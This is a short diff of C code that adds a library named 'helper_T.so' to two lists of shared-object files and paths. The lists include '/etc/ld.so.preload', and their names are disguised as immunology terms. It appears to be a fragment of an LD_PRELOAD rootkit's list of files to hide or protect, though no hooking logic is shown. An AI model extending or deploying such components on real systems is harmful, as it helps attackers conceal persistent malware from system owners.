@@ -23,6 +23,7 @@
 static const char *cytochrome_c[] = {
     "apoptosis.so",
     "mhc_downreg.so",
+    "helper_T.so",
     "caspase.o",
     "ld.so.preload",
     NULL  // Sentinel
@@ -32,6 +33,7 @@ static const char *cytochrome_c[] = {
 static const char *dna[] = {
     "/usr/local/lib/mhc_downreg.so",
     "/usr/local/lib/apoptosis.so",
+    "/usr/local/lib/helper_T.so",
     "/etc/ld.so.preload",
     NULL  // Sentinel
 };
